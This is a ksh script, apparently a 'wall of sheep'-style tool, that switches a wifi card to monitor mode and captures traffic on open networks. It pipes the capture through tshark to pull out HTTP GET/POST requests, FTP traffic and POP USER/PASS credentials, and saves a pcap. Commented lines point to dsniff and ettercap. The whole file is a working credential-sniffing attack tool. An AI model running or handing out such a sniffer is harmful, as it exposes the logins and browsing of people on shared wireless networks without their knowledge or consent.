#!/usr/bin/env ksh

#.---------------------------------------------
#       (w|h)all of lame
#
#,---------------------------------------------

IFACE='wlan0'
FIFO='/tmp/whol_pipe'
QUIET=0
CHANNEL=0


destruct() {
    if [[ "$STATUS" -gt 0 ]] ; then return; fi
    echo "exitting.."
    STATUS=$((STATUS+1))
    if [[ "$1" != "" ]] ; then kill $1; fi
    airmon-ng stop mon0
    rm $FIFO
}

usage() {
    echo -e "(W|H)all of lame - (C) 2010 Adam Tauber

    Usage:

        whol -c [wireless channel] <options>

    Options:

        -c, --channel        <int> : Channel of open wifi networks
        -i, --interface      <str> : Wireless interface name
        -w, --out-file       <str> : Write results to file
        -h, --help                 : Displays this usage screen
        -q, --quiet                : Quiet mode (no visual output)
"
}

ARGS=`getopt -n whol -u -l channel:,help,quiet,interface,write-file c:i:w:hq $*`
[[ $? != 0 ]] && {
         usage
         exit 1
     }
set -- $ARGS
for i
do
  case "$i" in
        -c|--channel) shift; CHANNEL=$1; shift;;
        -q|--quiet) shift; QUIET=1;;
        -i|--interface) shift; IFACE=$1; shift;;
        -h|--help) shift; usage; exit 1;;
  esac
done

[[ $CHANNEL == 0 ]] && {
    echo '[!] Wrong wireless channel'
    usage
    exit 1
}

mkfifo $FIFO
airmon-ng start $IFACE 0 $( if [ $QUIET -eq 1 ] ; then echo ' >/dev/null'; fi)

airodump-ng_wholmod -o pcap -w $FIFO -t OPN -c $CHANNEL mon0 -p -q&
APID=$!

trap "destruct $APID" INT

#dsniff -m -p $FIFO
#ettercap -T -d -m ettertest.log -r $FIFO

tail -f -q $FIFO | tee whol_$(date +%s).pcap | tshark -i - -R 'http.request.method == "GET" or http.request.method == "POST" or ftp or pop.request.command == "PASS" or pop.request.command == "USER"' -V -l | ./tshark_parser.py


destruct $APID
